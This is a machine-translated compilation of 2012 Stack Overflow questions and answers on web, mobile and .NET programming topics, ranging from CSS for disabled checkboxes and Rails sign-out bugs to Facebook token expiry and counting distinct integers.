> 赞同：2
> 
> 时间：2012-06-27T22:06:07.233
> 
> 标签：javascript, html, css, forms

我正在使用 javascript 禁用复选框：

```
       $('#test').attr("disabled", "true");
```

但我想让禁用复选框的背景更暗，因为很难说它被禁用了。有没有办法使用 HTML/CSS/JS>

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:08:58.240

不容易。复选框的呈现方式由浏览器决定。您必须将其替换为基于 JavaScritpt 的自定义解决方案才能为其提供自定义呈现，但这会带来其他问题。

您*可以*做的是使禁用的复选框更加透明：

```
 select[disabled] { opacity: .5 } 
```

这适用于 IE >= 9 和所有其他主要浏览器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T23:02:15.297

您可以尝试将复选框包装在容器中`div`，并使用`input:disabled`如下 CSS 规则：[jsFiddle example](http://jsfiddle.net/BTaZ8/1/)。

我已经在最新的 Windows 版本的 Internet Explorer、Firefox、Chrome、Opera 和 Safari 中对此进行了测试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:09:22.397

您可以为禁用的输入表单元素指定 CSS 样式，如下所示：

```
input[disabled]{
 color:#666 !important; // Whatever styling here...
 opacity: .3;
} 
```

# buddypress - Buddypress 多站点与共享用户但隔离组、活动、论坛

> ID：11235464
> 
> 赞同：1
> 
> 时间：2012-06-27T22:06:28.140
> 
> 标签：buddypress

我有这个项目来创建一个多站点 Wordpress + Buddypress 网络。

用户表应该对网络中的所有站点共享和公用（网络中所有站点的用户配置文件相同），但每个站点应该有自己的活动流、组和论坛。

有任何想法吗？建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-10T17:35:53.047

Buddypress Multi-Network 插件可能是您正在寻找的。您可以在单个 Buddypress 安装上创建多个社交网络。

[Buddypress 多网络插件](http://buddydev.com/buddypress/introducing-buddypress-multi-network-plugin-create-multiple-separate-social-networks-on-a-single-buddypress-install/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-17T10:30:37.083

较新版本的 BuddyPress 已内置此功能，您不需要任何其他插件，只需将此行粘贴到 wp-config.php 文件中

```
define( 'BP_ENABLE_MULTIBLOG', true ); 
```

您还可以在插件文件夹中创建一个名为**bp-custom.php**的文件，如果您不想更改 wp-config.php 文件，则将该行粘贴到那里

# django - 守护 Django 管理命令

> ID：11235465
> 
> 赞同：2
> 
> 时间：2012-06-27T22:06:30.543
> 
> 标签：django, sockets, daemon, celery

我正在尝试创建一个套接字应用程序，该应用程序使用 python 的 smptd 和 asyncore 库侦听端口 25 中的传入电子邮件，该应用程序应该有权访问 Django ORM 以采取必要的操作。

到目前为止，我所做的方法是创建一个直接访问 Django 数据库的 python 脚本，并在主管下运行它，但这不是一个好的解决方案。合适的应该是有一个管理命令或类似任务队列（Celery）的东西。

如果我创建一个 Django 管理命令来运行这个长时间运行的套接字应用程序，我可以将它附加到主管吗？我需要守护它吗？有什么区别，我该如何守护它？我找到了 django.utils.daemonize 但没有找到任何关于它的文档。

用Celery解决会更合适吗？我的应用程序监听一个套接字，而 Celery，据我了解，等待触发，我没有在 celery 中找到任何在启动 celeryd 时自动启动的长时间运行任务的示例。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T10:03:03.533

对于您的任务，使用 python + [supervisord](http://supervisord.org)是我认为的最佳解决方案。因为 Celery 的目标是执行任务，并运行计划任务。当您的脚本为 Celery 创建任务时，有退出方式，它将提供更好的性能。但是只有当你需要运行计划的后台任务，或者你的守护进程中有长时间执行的任务时，你才应该使用 celery。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-13T16:53:27.603

作为管理命令的替代解决方案，我建议您让您的电子邮件服务器调用 Django 提供的 Web 服务。

这有几个好处

*   邮件服务器与 Django 分离，因此您可以根据需要将它们放在不同的服务器上
*   您需要的唯一守护程序是邮件程序
*   不需要 celery——Django 不需要关心任何触发，因为 Django 组件是被动的

# node.js - Express App.error 不适用于 Node.js 0.8.0 我该怎么办

> ID：11235467
> 
> 赞同：1
> 
> 时间：2012-06-27T22:06:41.300
> 
> 标签：node.js, express

我刚刚安装了 Node 0.8.0 并且还更新了 express。但是， app.error 不再起作用。有没有办法解决或解决这个问题？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T08:25:49.820

来自：[https ://github.com/visionmedia/express/wiki/Migrating-from-2.x-to-3.x](https://github.com/visionmedia/express/wiki/Migrating-from-2.x-to-3.x)

**删除：** - app.error()（使用中间件（err，req，res，next））

# java - FTPClient 无法打开文件，没有这样的文件或目录

> ID：11235472
> 
> 赞同：1
> 
> 时间：2012-06-27T22:07:16.883
> 
> 标签：java, android, ftp, ftp-client

我一直在尝试通过 FTPClient 将文件发送到 ftp 服务器，但是当我收到回复字符串时，它说：

> 553 无法打开文件：没有这样的文件或目录。

这是代码：

```
try 
{
    FTPClient client = new FTPClient();
    client.connect(hostname);
    client.login(username, password);

    client.setFileType(FTP.BINARY_FILE_TYPE);
    client.enterLocalPassiveMode();
    client.changeWorkingDirectory(workingDir);          
    File dir = new File(savePath + fileName);
    FileInputStream fIS = new FileInputStream(dir);

    for(File files : dir.listFiles())
    {
        boolean success = client.storeFile(files.getPath(), fIS);
        Toast.makeText(getBaseContext(), client.getReplyString(), Toast.LENGTH_LONG).show();
        Toast.makeText(getBaseContext(), files.getPath() + " Stored = " + success, Toast.LENGTH_LONG).show();
    }

    fIS.close();
    client.logout();
} 
catch (SocketException e) 
{
    Toast.makeText(getBaseContext(), e.getMessage(), Toast.LENGTH_LONG).show();
} 
catch (IOException e) 
{
    Toast.makeText(getBaseContext(), e.getMessage(), Toast.LENGTH_LONG).show();
} 
```

我一直在互联网上寻找答案，但没有任何效果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:24:28.390

我在 CoolBeans 的帮助下解决了这个问题。

对于任何有类似问题的人，解决方案是

1.更改：

```
client.storeFile(files.getPath(), fIS); 
```

到：

```
client.storeFile(files.getName(), fIS); 
```

并将 FileInputStream 移动到 for 循环中并将其更改为：

```
new FileInputStream(files); 
```

# ruby-on-rails-3 - 签出不工作的rails 3.2

> ID：11235474
> 
> 赞同：4
> 
> 时间：2012-06-27T22:07:24.997
> 
> 标签：ruby-on-rails-3, session, destroy

我已经完成了 Michael Hartl 的教程，现在我正在使用它来构建一个项目。对于身份验证/授权，我基本上使用教程中的相同代码以及我使用它构建的示例应用程序。在我的项目中，虽然注销（销毁会话）不起作用。单击注销链接后，它会重定向到主页，但导航中有错误的链接，我仍然可以访问我不应该能够访问的页面（表明我仍在登录）而且我不能找出问题所在。有任何想法吗？

会话控制器

```
class SessionsController < ApplicationController
 def new
render 'new'
end

def create
user = User.find_by_email(params[:session][:email])
if user && user.authenticate(params[:session][:password])
  sign_in user
  redirect_to user
else
  flash.now[:error] = 'Invalid email/password combination'
  render 'new'
end
end

def destroy
 sign_out
 redirect_to root_path
end
end 
```

会话助手

```
module SessionsHelper

  def sign_in(user)
cookies.permanent[:remember_token] = user.remember_token
self.current_user = user
end

def signed_in?
!current_user.nil?
end

def current_user=(user)
@current_user = user
end

def current_user
@current_user ||= User.find_by_remember_token(cookies[:remember_token])
end

def current_user?(user)
user == current_user
end

def sign_out
self.current_user = nil
cookies.delete(:remember_token)
end
end 
```

标题链接

```
 <header>
          <h1><%= link_to image_tag('logo.gif'), root_path %></h1>
           <div id="login-sec">
          <div class="login-row">
            <div class="col">

            <% if signed_in? %>

            <ul>
              <li><%= link_to "Signout", signout_path, method: "delete" %></li>
            </ul>

            <% else %>  

            <ul>
                <li><%= link_to "Forgot Password", "#" %></li>
                <li class="last"><%= link_to "New user register here", signup_path %>               </li>
            </ul>

            <br /><br /><center><%= link_to image_tag('go-btn.png'), signin_path %></center>
            <% end %>

          </div>
        </header> 
```

用户模型（创建记住令牌的地方）

```
class User < ActiveRecord::Base
attr_accessible :company, :name, :email, :password, :password_confirmation
has_secure_password

before_save { |user| user.email = email.downcase }
before_save :create_remember_token

validates :name,  presence: true, length: { maximum: 70 }
VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
validates :email, presence: true, 
                  format: { with: VALID_EMAIL_REGEX },
                  uniqueness: { case_sensitive: false }
validates :password, presence: true, length: { minimum: 6 }
validates :password_confirmation, presence: true        

private

def create_remember_token
  self.remember_token = SecureRandom.urlsafe_base64
end       
end 
```

路由文件

```
App::Application.routes.draw do
resources :users
resources :sessions, only: [:new, :create, :destroy]

root to: 'static_pages#home'

match '/about',          to: 'static_pages#about'
match '/contact',        to: 'static_pages#contact'
match '/signup',         to: 'users#new'
match '/about-yourself', to: 'users#about-yourself'
match '/signin',         to: 'sessions#new'
match '/signout',        to: 'sessions#destroy', via: :delete 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T22:47:06.927

弄清楚了。我在加入注销操作之前创建了用户，因此我可以测试登录和注册操作。没有为这些用户创建记住令牌，因此他们始终登录并且没有要销毁的记住令牌

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:21:12.067

您提供的所有代码对我来说都很好。你确定你的 config/routes.rb 中有适当的条目吗，它应该看起来像 match '/signout', to: 'sessions#destroy', via: :delete

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-24T15:58:01.807

正如您正确指出的那样，问题在于没有记住令牌的用户。

如果您的用户模型有以下行：

```
before_save:create_remember_token 
```

然后通过 rails 控制台简单地循环并重新保存数据库中的每个条目即可：

```
User.all.each { |user| user.save(validate:false)} 
```

或者，耙`db:reset`然后通过站点创建所有新用户。

# gtk - GTK 等效于 Win32 PostMessage()

> ID：11235475
> 
> 赞同：0
> 
> 时间：2012-06-27T22:07:27.650
> 
> 标签：gtk, gtk3

我正在将 Win32 应用程序移植到 C 中的 GTK+ 应用程序。

UI 向另一个（非 UI）库注册回调。当库需要用户提供一些额外的信息时，它会调用回调。UI 提示用户输入，然后在用户输入请求的信息时调用不同的库“setinfo”调用。UI 不能阻止库的回调等待用户输入。

在 Windows 中，这是通过将自定义消息发布到主窗口并立即返回的回调来处理的。主窗口将显示一个对话框来收集用户输入，并在应用时通过“setinfo”将此信息向下推送。

在 GTK 中实现这一点的等效或首选机制是什么？也就是说，如何发布某种自定义消息或事件，导致对话框跑出 GTK 的主线程并快速返回回调线程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T10:25:35.757

所以你有你的 UI 和外部库 L。我认为正确的解决方案是这样的：

1.  在第一个回调中，L 调用 UI，您会弹出一个 GtkDialog。
2.  您不调用`gtk_dialog_run()`，这会使对话框模态但会阻止 L。
3.  当对话框生成响应信号时，您对其进行解析并回调到`L.setinfo()`.
4.  你关闭对话框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-14T23:00:35.410

对我有用的解决方案是[g_idle_add()](http://www.gtk.org/api/2.6/glib/glib-The-Main-Event-Loop.html#g-idle-add "g_idle_add()")。

在回调线程中：

```
g_idle_add(MyPromptFunction, someData);
return; 
```

这将返回到库。然后主 ui 线程调用 MyPromptFunction，从中我可以显示我的对话框，收集所需信息，并通过 SetInfo() 将其重新提交到库。

# android - 如何将base64字符串（图像）从android存储到.Net服务器

> ID：11235476
> 
> 赞同：0
> 
> 时间：2012-06-27T22:07:28.033
> 
> 标签：android, .net, web-services, ksoap

有人可以帮我解决这个问题吗？我正在尝试使用 android 上的 ksoap 将 base64 字符串格式的图像上传到 .Net Web 服务（Web 服务器）。当我单击 android 应用程序上的提交按钮时，我能够成功上传文件，但它冻结并停止响应。我到处寻找解决方案，我找不到任何东西。大多数使用 Post 方法到 PHP 服务器的解决方案。请帮忙！提前致谢。

这是我的代码；

```
btnSubmit.setOnClickListener(new OnClickListener(){
       public void onClick(View v)
       {           

          //save image to path///////////////////
          try{
          String ImageData = lblEncodedImage.getText().toString();            
          imagefile = lblTargetUri.getText().toString();

              //webservice class for android.
          WebServiceCaller DWSCaller = new WebServiceCaller();
          int uploadResult = DWSCaller.UploadFile(ImageData, imagefile);

          if(uploadResult == 1){                
            //do something              
            lblStatus.setText("Submitted!");

          }
          else
          {
            lblStatus.setText("Error Submitting");
          }
          }
          catch(Exception e) {
                e.printStackTrace();
                lblStatus.setText("Error Submitting" + e.getMessage());
          }

          ////////////////////////////////////////
       }
   });

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data){
    super.onActivityResult(requestCode, resultCode, data);

    if(resultCode == RESULT_OK){

        try { 
        Uri targetUri = data.getData();
        //txtTargetUri.setText(targetUri.toString());       

        String fileName  = getRealPathFromURI(targetUri);
        File aFile = new File(fileName);

        ///////////////////////

        lblTargetUri.setText(aFile.getName());
        lblImagePath.setText(fileName);

        Bitmap bitmap;

    //bitmap =                                                                 BitmapFactory.decodeStream(getContentResolver().openInputStream(targetUri));
              //Or use decodefile method
bitmap = BitmapFactory.decodeFile(fileName);

              targetImage.setImageBitmap(bitmap);

              //base 64     conversion                                

              ByteArrayOutputStream baos = new ByteArrayOutputStream();
              bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);

              byte[] byteArray = baos.toByteArray();

              //Bitmap bm = BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length);
              //targetImage.setImageBitmap(bm);

              encodedImage = Base64.encodeToString(byteArray, Base64.DEFAULT);

              lblEncodedImage.setText(encodedImage);

             } catch (Exception e) {
              // TODO Auto-generated catch block                     
              e.printStackTrace();
             }

    }
}

public String getRealPathFromURI(Uri contentUri) {
    String[] proj = { MediaStore.Images.Media.DATA };
    Cursor cursor = managedQuery(contentUri, proj, null, null, null);
    int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
    cursor.moveToFirst();
    return cursor.getString(column_index);
} 
```

我还创建了一个名为 WebServiceCaller 的不同类，这里是代码；

```
public class WebServiceCaller {

private final String NAMESPACE = "http://tempuri.org/"; 
private final String URL = "http://10.0.2.2:63097/service.asmx?WSDL";   

public int UploadFile(String imageData, String filename){
    int result = 0;
    final String SOAP_ACTION = "http://tempuri.org/CreateFileFromBase64String";     
    final String METHOD_NAME = "CreateFileFromBase64String";

    SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);    

    PropertyInfo propInfo1 =new PropertyInfo();
    propInfo1.setName("_imageData");
    propInfo1.setValue(imageData);
    propInfo1.setType(String.class);
    request.addProperty(propInfo1);

    PropertyInfo propInfo2 =new PropertyInfo();
    propInfo2.setName("_filename");
    propInfo2.setValue(filename);
    propInfo2.setType(String.class);
    request.addProperty(propInfo2);

    SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
    envelope.dotNet = true; // put this only if the web service is .NET one
    envelope.setOutputSoapObject(request);
    HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

    try {
        androidHttpTransport.call(SOAP_ACTION, envelope);
        SoapPrimitive response = (SoapPrimitive)envelope.getResponse();
        Log.i("myApp", response.toString());
        if(response.toString().equalsIgnoreCase("true")){
            result = 1;
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return result;
}
} 
```

这是我的 .Net 网络服务的网络方法

```
 [WebMethod]
    public bool CreateFileFromBase64String(string _imageData, string _filename)
    {
        try
        {

            string path = @"C:\inetpub\wwwroot\web\";
            MemoryStream msf = new MemoryStream(Convert.FromBase64String(_imageData));
            Stream stem = new FileStream(path + _filename, FileMode.Create);
            msf.WriteTo(stem);
            msf.Flush();
            msf.Close();
            stem.Close();

            return true;
        }
        catch { return false; }
    } 
```

我的清单中有这个。当我更改 SDKVersion 时，它会停止保存文件并仍然冻结。任何建议。

```
<uses-sdk android:minSdkVersion="8" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.CAMERA"/>
<uses-feature android:name="android.hardware.camera" />
<uses-feature android:name="android.hardware.camera.autofocus" /> 
```

日志猫：

06-29 16:08:48.522: D/dalvikvm(8660): threadid=1: 撤消后仍然挂起 (sc=1 dc=1) 06-29 16:10:26.225: D/AndroidRuntime(8660): 关闭VM 06-29 16:10:26.225: W/dalvikvm(8660): threadid=1: 线程以未捕获的异常退出 (group=0x409c01f8) 06-29 16:10:26.292: E/AndroidRuntime(8660): 致命异常：主要 06-29 16:10:26.292: E/AndroidRuntime(8660): java.lang.NullPointerException 06-29 16:10:26.292: E/AndroidRuntime(8660): 在 com.micsoftwares.iltc.GalleryRegister$UploadTask.onPostExecute (GalleryRegister.java:51) 06-29 16:10:26.292: E/AndroidRuntime(8660): at com.micsoftwares.iltc.GalleryRegister$UploadTask.onPostExecute(GalleryRegister.java:1) 06-29 16:10:26.292 : E/AndroidRuntime(8660): 在 android.os.AsyncTask.finish(AsyncTask.java:602) 06-29 16:10:26.292: E/AndroidRuntime(8660): 在 android.os.AsyncTask。访问$600(AsyncTask.java:156) 06-29 16:10:26.292: E/AndroidRuntime(8660): 在 android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:615) 06-29 16:10:26.292 : E/AndroidRuntime(8660): 在 android.os.Handler.dispatchMessage(Handler.java:99) 06-29 16:10:26.292: E/AndroidRuntime(8660): 在 android.os.Looper.loop(Looper. java:137) 06-29 16:10:26.292: E/AndroidRuntime(8660): 在 android.app.ActivityThread.main(ActivityThread.java:4424) 06-29 16:10:26.292: E/AndroidRuntime(8660) : 在 java.lang.reflect.Method.invokeNative(Native Method) 06-29 16:10:26.292: E/AndroidRuntime(8660): 在 java.lang.reflect.Method.invoke(Method.java:511) 06- 29 16:10:26.292: E/AndroidRuntime(8660): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784) 06-29 16:10:26.292: E/AndroidRuntime(8660) : 在 com.android。internal.os.ZygoteInit.main(ZygoteInit.java:551) 06-29 16:10:26.292: E/AndroidRuntime(8660): at dalvik.system.NativeStart.main(Native Method)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:38:52.823

您似乎正在主 UI 线程上上传文件。您不应该这样做，而是让自己熟悉[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)（这会将繁重的工作转移到单独的线程中）。

# .net - .NET 中不同 Int32 值的计数

> ID：11235478
> 
> 赞同：3
> 
> 时间：2012-06-27T22:07:49.303
> 
> 标签：.net

我正在接收一个无序的 Int32 值流，并且需要跟踪我收到的不同值的计数。

我的想法是将 Int32 值添加到`HashSet<Int32>`. 根据 HashSet 的行为，根本不会添加重复条目。

我是否正确理解集合成员资格基于 GetHashCode() 并且 Int32 的哈希码是数字本身？

有没有一种方法可以提高 CPU 或内存效率？

**更新**

数据流相当大。简单地使用 Linq 迭代流以获得不同的计数不是我想要的，因为这将涉及第二次迭代流。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T22:09:34.660

假设你有某种`IEnumerable<int>`你可以做以下事情：

```
int count = stream.Distinct().Count(); 
```

* * *

> 我是否正确理解集合成员资格基于 GetHashCode()

不完全的。a 中的成员资格`HashSet`基于`GetHashCode`和 等式检查的组合。通常，两个对象可以具有相同的哈希码但不相等。虽然`int`那不可能发生。

> 并且 Int32 的哈希码是数字本身？

对，那是正确的。

> 有没有一种方法可以提高 CPU 或内存效率？

如果您知道您的整数将在一个小范围内，您可以使用位图有效地存储您所看到的。例如，如果您有 1,000,000 的范围，您可以将您看到的整数存储在 1,000,000 位中。在索引 n 处设置为 1 表示您已经看到整数 n。下面是一些示例代码，展示了一种实现方式：

```
void Main()
{
    int max = 1000000;

    IEnumerable<int> stream = GetStream(max);

    int count = DistinctCount(stream, max);
    int count2 = stream.Distinct().Count();
    Debug.Assert(count == count2);
}

int DistinctCount(IEnumerable<int> stream, int max)
{
    int[] seen = new int[max / 32];
    foreach (int x in stream)
    {
        seen[x / 32] |= 1 << (x % 32);
    }

    int count = 0;
    foreach (uint s in seen)
    {
        uint t = s;
        while (t > 0)
        {
            if (t % 2 == 1) { count++; }
            t /= 2;
        }
    }
    return count;
}

IEnumerable<int> GetStream(int max)
{
    List<int> stream = new List<int>();
    Random random = new Random();
    for (int i = 0; i < 2000000; ++i)
    {
        stream.Add(random.Next(max));
    }
    return stream;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-29T03:11:41.517

一个想法是，如果您有*非常*大的数据流（数百万到数十亿），则可以使用[Bloom 过滤器](http://en.wikipedia.org/wiki/Bloom_filter)。这将使您能够在流式传输数据时确定近似计数，如果您需要精确计数，您可以离线处理它。

一个合理的 C# 实现在这里：[http ://bloomfilter.codeplex.com/](http://bloomfilter.codeplex.com/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-27T18:20:23.197

不太了解您的领域，但是有一些算法可以使用非常小的内存和处理来计算大集合的基数。

我在我的一个项目中使用 HyperLogLog。我用它来计算数百万个不同的项目，使用低至 8KB 的内存，误差为 1%。

这是一篇描述它的论文：

[http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf](http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf)

我已经用 Java 和 Python 实现了它。Python版本是开源的，算法相当小。看看这个：

[https://github.com/juanplopes/hyperloglog.py/blob/master/hyperloglog.py](https://github.com/juanplopes/hyperloglog.py/blob/master/hyperloglog.py)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T22:27:35.517

我假设您以块的形式接收值，一次一个整数到一堆整数。

鉴于此，最简单的可能是最好的，我也会使用哈希。但是我看不到如何使用 HashSet。如果你想要不同值的计数，你只会得到找到的值

```
Dictionary<int,int> _countHash = new Dictionary<int,int>();
void moreIntsArrived(IEnumerable<int> bunch)
{
   foreach(var value in bunch)
   {
       if (_countHash.ContainsKey(value))
       {
             _countHash[value] += _countHash[value];
       }
       else
       {
             _countHash[value] = 0;
       }
   }
} 
```

然而，按照[汉斯尔曼先生的建议，测量它](http://www.hanselman.com/blog/BackToBasicsYouArentSmarterThanTheCompilerPlusFunWithMicrobenchmarks.aspx)

*如果*您的流足够大以停止获取新的唯一值，则在执行 ContainsKey 检查和在未找到密钥时仅处理异常之间可能存在权衡

```
void moreIntsArrived(IEnumerable<int> bunch)
{
   foreach(var value in bunch)
   {
       try
       {
            int c = _countHash[value];
             _countHash[value] = c + 1;
       }
       catch(KeyNotFoundException)
       {
             _countHash[value] = 0;
       }
   }
} 
```

然后还有 Dictionary::TryGetValue() 方法，但这取决于它内部的作用:-)**使用源**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-29T03:00:25.873

我很欣赏其他答案，但发现使用 a 的原始方法`HashSet<T>`最适合我的情况。

重新迭代流以获得不同的计数效率不高。

# asp.net-mvc-3 - 使用 MVC 辅助扩展在 Kendo UI Grid 上实现 groupby 表达式

> ID：11235481
> 
> 赞同：1
> 
> 时间：2012-06-27T22:08:18.860
> 
> 标签：asp.net-mvc-3, grid, group-by, kendo-ui, custom-binding

我正在使用 Kendo UI Grid 来显示我的结果。我正在使用 asp.net mvc 帮助程序扩展方法来创建具有自定义绑定的网格，以按照文档 (http://www.kendoui.c​​om/documentation/asp-net-mvc/helpers/grid) 中的说明实现分页/custom-binding.aspx)。我的结果数据可以分为 5 个不同的组（Group1Id、Group2Id...）。我需要使用这些组 ID 对结果进行分组。谁能告诉我如何实现 groupBy。在 Telerik 网格（用于网络表单）中，我使用了 GridGroupByExpression。我想要类似于这种行为的东西。有

```
.Group(groups =>
    {
       groups.Add(p => p.Group1Id);
        groups.Add(p => p.Group2Id);
    } 
```

它不适用于自定义绑定。但是，它适用于服务器绑定。我还没有尝试过 Ajax 绑定。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T00:43:10.763

分组的完成方式类似于自定义绑定的排序方式。

```
public ActionResult Index([DataSourceRequest]DataSourceRequest request)
{
  IQueryable<Order> orders = new NorthwindDataContext().Orders;

  //Apply grouping
  foreach (GroupDescriptor groupDescriptor in request.Groups)
  {
    switch (groupDescriptor.Member)
    {
      case "Group1Id":
        orders.GroupBy(s => s.Group1Id);
        break;
      case "Group2Id":
        orders.GroupBy(s => s.Group2Id);
        break;
    }
  }

  return View(orders);
} 
```

# java - 现在不推荐使用offline_access，我该如何处理服务器端身份验证？

> ID：11235486
> 
> 赞同：0
> 
> 时间：2012-06-27T22:08:47.163
> 
> 标签：java, facebook-graph-api, facebook-access-token

随着访问令牌即将消亡，我希望有人可以帮助解决我相当独特的问题。

我已阅读有关[https://developers.facebook.com/roadmap/offline-access-removal/的所有文档](https://developers.facebook.com/roadmap/offline-access-removal/)

而且我认为我的应用程序属于一个完全不同的类别。我们有一个应用程序很少向 facebook 发布消息（它们之间可能是几年），但这些帖子非常重要。这些发布是在运行 tomcat 的 JVM 中启动的，但不一定由用户所做的任何事情启动。

当用户安装他们的应用程序版本时，他们使用浏览器通过正常的服务器端身份验证过程

[https://graph.facebook.com/oauth/authorize?client_id=APP_ID&scope=publish_stream,manage_pages,offline_access&response_type=token&redirect_uri=MY_REDIRECT_URL](https://graph.facebook.com/oauth/authorize?client_id=APP_ID&scope=publish_stream,manage_pages,offline_access&response_type=token&redirect_uri=MY_REDIRECT_URL)

从历史上看，我的应用程序将生成的访问令牌（永不过期）存储在数据库中。现在，随着offline_access 的弃用，这个访问令牌现在是一个短期令牌，显然可以通过转到

[https://graph.facebook.com/oauth/access_token?client_id=AP_ID&client_secret=APP_SECRET&grant_type=fb_exchange_token&fb_exchange_token=OLD_SHORT_TOKEN](https://graph.facebook.com/oauth/access_token?client_id=AP_ID&client_secret=APP_SECRET&grant_type=fb_exchange_token&fb_exchange_token=OLD_SHORT_TOKEN)

所以我可以去上面的 URL 并存储返回的长期访问令牌。到现在为止还挺好。这就是问题所在......

如前所述，我的应用程序可能在几个月或几年内（即在我的 60 天令牌过期后）都不会尝试发布到 facebook。根据文档，我可以使用 fb_exchange_token 选项将短期令牌交换为 60 天令牌，但我无法将即将到期的 60 天令牌交换为新的 60 天令牌。我发现获得新的短期令牌的唯一方法是让用户登录并生成它。那是我的问题。据我了解，如果没有用户再次登录，我将无法获得新的短期令牌。

我试图想一个更容易理解的类比，这是我想出的最好的。

假设我有一个 bash 脚本，该脚本每 90 天在 cron 中运行一次，以向公司的 facebook 页面发布消息，宣布季度报告可用。在新的、已弃用的 offline_access 世界中，我怎样才能使这个 cron 工作正常工作？我存储的唯一客户特定数据是 60 天访问令牌，而 bash 脚本没有用户界面。

如果我做了最骇人听闻的解决方案，并要求安装我们的应用程序的人在安装过程中包含他们的 fb 用户名和密码，那将如何工作。有没有办法向图形 api 提供用户名和密码，然后使用 HttpClient 之类的东西模拟登录和 oauth 点击流？

理想情况下，如果我有类似 fb_exchange_token 的选项，可以将 60 天令牌交换为新的 60 天令牌，我可以编写一些东西，每天对 facebook 进行一次采样，以查看我的 60 天令牌离到期有多近以及何时到期一两天执行一个新的 fb_exchange_token 并保存新的 60 天令牌。

对不起，如果这是一个罗嗦的帖子。我试图将所有信息都放在那里，以便有人可以提供帮助而无需提出后续问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T09:24:54.207

> 据我了解，如果没有用户再次登录，我将无法获得新的短期令牌。

好吧，这就是删除 offline_access 的全部*意义*……</p>

> 假设我有一个 bash 脚本，该脚本每 90 天在 cron 中运行一次，以向公司的 facebook 页面发布消息，宣布季度报告可用。在新的、已弃用的 offline_access 世界中，我怎样才能使这个 cron 工作正常工作？

使用*页面*访问令牌而不是*用户*访问令牌 -*页面*访问令牌不会过期（只要您获得它们的用户没有更改他的密码或完全离开平台）。

> 如果我做了最骇人听闻的解决方案，并要求安装我们的应用程序的人在安装过程中包含他们的 fb 用户名和密码，那将如何工作。

这将明显违反 FB 平台政策。你甚至不应该考虑这样做。

> 理想情况下，如果我有类似 fb_exchange_token 的选项，可以将 60 天的代币换成新的 60 天的代币 […]

同样，如果 Facebook 希望这成为可能，他们一开始就不需要删除 offline_access。

# c# - 制作空白字符串的优雅方法

> ID：11235487
> 
> 赞同：0
> 
> 时间：2012-06-27T22:08:48.740
> 
> 标签：c#, .net

有没有一种优雅的方法来制作**空白**字符串。更准确地说，我正在寻找类似于以下的解决方案：

对于一个空字符串，我可以写

```
string emptyString = ""; 
```

但相反，我使用这种更具描述性的方式

```
string emptyString = string.Empty; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:17:52.287

我觉得这非常优雅：

```
string singleSpace = " "; 
```

对我来说似乎很有表现力。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-14T15:02:26.603

这就是我制作单字符长字符串的方式（通常用于银行基于位置的文件）：

```
string absurdlyLongWhiteSpaceString = string.Empty.PadLeft(500); 
```

或 '0' 填充空数值的字符串：

```
string absurdlyLongZeroedString = string.Empty.PadLeft(500, '0'); 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:12:27.443

我个人更喜欢使用`""`over `string.Empty`，但没有什么能阻止你编写字符串常量类：

```
public static class Strings
{
    public const string Space = " ";
}

...

string whitespace = Strings.Space; 
```

（请注意，我没有调用它`Whitespace`，因为这会模棱两可 - 例如，制表符是空格。）

不能说我对这样的课程很有用......

# javascript - 在创建时设置 Javascript 对象值

> ID：11235488
> 
> 赞同：1
> 
> 时间：2012-06-27T22:08:50.690
> 
> 标签：javascript, javascript-objects

是否可以将一个对象的键设置为同一对象`$thumbnailContainer`中另一个对象的值？`thumbnailImg``gallerySelectors`

例子：

```
var gallerySelectors = {
    '$thumbnailContainer' : $('#thumb'),
    'thumbnailImg' : this.$thumbnailContainer.find('img')
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:13:05.720

不，不幸的是，没有。幸运的是，替代方案同样简单：

```
var gallerySelectors = {
    $thumbnailContainer: $('#thumb')
};

gallerySelectors.thumbnailImg = gallerySelectors.$thumbnailContainer.find('img'); 
```

